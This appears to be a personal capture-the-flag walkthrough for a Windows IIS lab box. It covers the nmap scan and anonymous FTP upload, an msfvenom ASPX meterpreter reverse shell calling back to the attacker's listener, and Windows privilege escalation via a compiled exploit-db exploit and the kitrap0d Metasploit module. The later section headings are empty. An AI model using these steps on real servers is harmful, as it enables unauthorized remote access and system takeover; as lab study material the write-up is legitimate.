**IPv4: 10.10.10.5**
## Enumeration/Scanning
sudo nmap -A -Pn -sS -oN nmap $IP

ports
* 21
	* anon allowed
* 80
	* Microsoft IIS httpd 7.5

anon login allowed for ftp

upload and download allowed, and resource can be accessed. I checked by
* echo test > test.html
* using ftp I uploaded it to the server
* accessed test.html through 10.10.10.5/test.html

I can upload a reverse shell

msfvenom is a payload generator
* msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o shell.aspx LHOST=10.10.14.6 LPORT=1127

put onto ftp server

use msfconsole to set up a listener in metasploit
* use exploit/multi/handler
* set payload windows/meterpreter/reverse_tcp
* set LHOST and LPORT
* run

open shell.aspx on site

use command shell to create shell

use systeminfo to find info on system and vuln

os version is 6.1.7600

searching google "6.1.7600 exploit"
* I found a priv esc exploit
* https://www.exploit-db.com/exploits/40564

I downloaded the exploit. It is important to note that it has to be compiled as well, which is seen in the following command:
* i686-w64-mingw32-gcc ~/Desktop/40564.c -o exploit.exe -lws2_32

uploaded it to the server through ftp

webserver is located in c:\inetpub\wwwroot

After running exploit.exe, I received the error This program cannot be run in DOS mode.

This is because of how I transferred the file via ftp. I switched to binary in ftp and uploaded it again. 

This time it worked, and I rooted the box.

another way to priv esc:
There is a suggester meterpreter module that suggested possible exploits in the current session.
* search suggester
* use post/multi/recon/local_exploit_suggester
* set session to current session
* run

service for exploit/windows/local/ms10_015_kitrap0d exploit is running so I can use it to priv esc
* use
* set session, LHOST, and LPORT
* exploit

## Exploitation


## Privilege Escalation


## Post-exploitation

